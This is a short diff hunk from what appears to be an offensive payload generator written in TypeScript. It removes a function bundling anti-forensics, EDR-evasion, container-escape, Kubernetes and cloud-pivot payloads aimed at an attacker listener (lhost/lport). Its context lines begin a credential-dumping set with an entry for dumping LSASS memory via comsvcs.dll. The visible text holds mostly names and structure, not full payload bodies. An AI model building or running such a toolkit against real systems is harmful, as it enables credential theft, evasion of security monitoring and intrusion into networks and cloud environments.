@@ -383,18 +383,6 @@ echo "=== USERDATA: $_UD"
   ];
 }
 
-export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
-  return [
-    ...buildLinuxAntiForensics(),
-    ...buildWindowsEdrEvasion(),
-    ...buildLotlLinuxPayloads(lhost, lport),
-    ...buildSupplyChainPayloads(lhost, lport),
-    ...buildContainerEscapePayloads(lhost, lport),
-    ...buildK8sPayloads(lhost, lport),
-    ...buildCloudPivotPayloads(lhost, lport),
-  ];
-}
-
 export function buildEdrDumpBypass(lhost: string, lport: string): VeilPayload[] {
   return [
     { id:"lsass_dump_comsvcs", name:"LSASS dump via comsvcs.dll MiniDump (LOLBin)", category:"Credential-Dump",
